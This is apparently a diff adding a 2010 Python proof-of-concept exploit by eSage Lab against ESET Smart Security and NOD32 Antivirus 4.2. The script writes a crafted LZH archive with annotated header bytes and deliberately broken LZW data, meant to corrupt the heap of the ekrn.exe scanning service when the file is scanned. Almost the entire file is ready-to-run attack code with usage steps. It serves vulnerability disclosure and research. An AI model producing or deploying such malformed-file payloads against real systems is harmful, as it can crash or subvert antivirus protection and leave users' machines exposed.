@@ -1,0 +1,41 @@
+#
+# ESET Smart Security 4.2 and NOD32 Antivirus 4.2 (x32-x64)
+# LZH archive parsing PoC exploit.
+#
+# Scanning of malicious file causes heap corruption in context
+# of the service process (ekrn.exe).
+# See Dr. Watson log (drwtsn32.log) for details.
+#
+# USAGE: python eset_lzh.py (TEST.LZH will be created)
+#
+# (c) 2010 eSage Lab
+# http://www.esagelab.com/
+# support@esagelab.com
+#
+
+data = (
+"\x21"	           # Size of archived file header
+"\x83"             # Checksum of remaining bytes
+"-lh"              # ID
+"5"                # Compression method (LZW, Arithmetic Encoding)
+"-"                # ID 
+"\x13\x00\x00\x00" # Compressed size
+"\x30\x00\x00\x00" # Uncompressed size
+"\xFB\x3A\x6C\x3B" # Original file date/time
+"\x20\x01"         # File attribute
+"\x08"             # File name length
+"TEST.TXT"         # File name
+"\xDC\x41\x4D\x00\x00\x00\x0B\x33\x6D\x66\x49\x5D" # !!! broken LZW compressed data
+"\x23\x08\x8A\x78\x00\x00\xC0\x81\xA5\xC0\xD7\x20" #
+)
+
+print "ESET Smart Security 4.2 and NOD32 Antivirus 4.2 (x32-x64) LZH File parsing PoC exploit"
+print "(c) 2010 eSage Lab"
+print "----------------------------"
+
+f = open("TEST.LZH", 'wb')
+f.write(data)
+f.close()
+
+print "TEST.LZH (%d bytes) created" % len(data)
+print "Now try to scan it with antivirus"
